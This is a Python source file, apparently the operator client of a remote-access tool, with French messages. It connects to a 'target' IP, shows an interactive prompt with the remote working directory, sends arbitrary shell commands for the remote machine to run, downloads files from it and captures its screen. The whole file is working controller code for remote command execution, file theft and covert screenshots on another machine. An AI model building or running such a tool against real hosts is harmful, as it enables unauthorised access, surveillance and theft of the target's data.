from base_socket import *
from spliter import commande_spliter


def file_already_exist(file_name: str):
    try:
        file = open(file_name, 'r')
    except FileNotFoundError:
        return False
    except IsADirectoryError:
        return 'isdir'
    else:
        file.close()
        return True


class Client(ClientSocket):
    def __init__(self):
        super().__init__()

    def download_file_localy(self, commande: str, destination: str) -> None:
        """Download file from server socket to local storage

        :param commande:
        :param destination: location for downloaded file
        :return: None
        """
        splited_commande = commande_spliter(commande)
        error = False

        if destination.lower() == 'q':
            print(colored_error("‼️Le fichier n'a pas ete telecharger."))

        else:
            if file_already_exist(destination) == 'isdir':
                print(colored_error(f"‼️ {destination} est un dossier."))
                error = True

            elif file_already_exist(destination):
                print(colored_error(f'‼️ Le fichier {destination} existe dejas'))
                error = True

            else:
                # Tell the server to send the file in the commande
                self.send_header_and_data(commande.encode(encoding=ENCODING))

                # Receiving the file or ('filenotfound' | 'isdir' | 'screenshot-error')
                output = self.recv_header_and_data(show_progress=True)

                if output == 'filenotfound'.encode(encoding=ENCODING):
                    # The file doesn't exist on the server
                    print(colored_error("‼️ Le fichier n'existe pas."))
                elif output == 'isdir'.encode(encoding=ENCODING):
                    # The file name specified is a directory
                    print(colored_error("‼️ Ne peut pas telecharger un dossier."))
                elif output == 'screenshot-error'.encode(encoding=ENCODING):
                    # Error for screenshot commande
                    print(colored_error(f"‼️ Impossibe d'effectuer une capture d'ecran."))
                else:
                    # The file is received successfully
                    # Write the file to the destination
                    with open(destination, 'wb') as f:
                        f.write(output)
                    print('Telechargement de ' + colored_info(f'{splited_commande[1]}') + ' dans ' +
                          colored_info(f'{destination}\n'))

            if error:
                new_destination = input('Entrez un nouvelle destination (ou "q" pour quitter)' + colored_info(': '))
                self.download_file_localy(commande, new_destination)

    def screenshot(self, commande: str, destination: str):
        splited_commande = commande_spliter(commande)
        if len(splited_commande) < 3:
            splited_commande.insert(1, '.screenshoot.png')

        new_commande = " ".join(splited_commande)

        self.download_file_localy(new_commande, destination)

    def run(self):
        while True:
            self.send_header_and_data('info'.encode(encoding=ENCODING))
            cwd = self.recv_header_and_data().decode(encoding=ENCODING)
            prompt = ('╭─' + colored_info(f' {self.serveraddress[0]}:{self.serveraddress[1]}') +
                      f' {cwd}' + f'\n╰─' + colored_info(' ❯ '))

            commande = ''
            while commande == '':
                commande = input(prompt)
            if commande.lower() == 'exit':
                self.send_header_and_data(commande.lower().encode(encoding=ENCODING))
                break

            try:
                splited_commande = commande_spliter(commande)
            except:
                print(colored_error('‼️ Mauvaise commande'))
            else:
                if len(splited_commande) == 3 and splited_commande[0] == 'download':
                    self.download_file_localy(" ".join(splited_commande[:2]), splited_commande[2])

                elif len(splited_commande) == 2 and splited_commande[0] == 'capture':
                    self.screenshot(splited_commande[0], splited_commande[1])

                else:
                    self.send_header_and_data(commande.encode(encoding=ENCODING))
                    output = self.recv_header_and_data()
                    print(output.decode(encoding=ENCODING))

        print(colored_success(colored_success(colored_success(f'\n‼️ Deconnecte\n'))))
        self.clientsocket.close()


if __name__ == '__main__':
    client = Client()
    target_ip = input("Entrez l'addresse IP du cible: ")
    client.connect(target_ip)
    client.run()
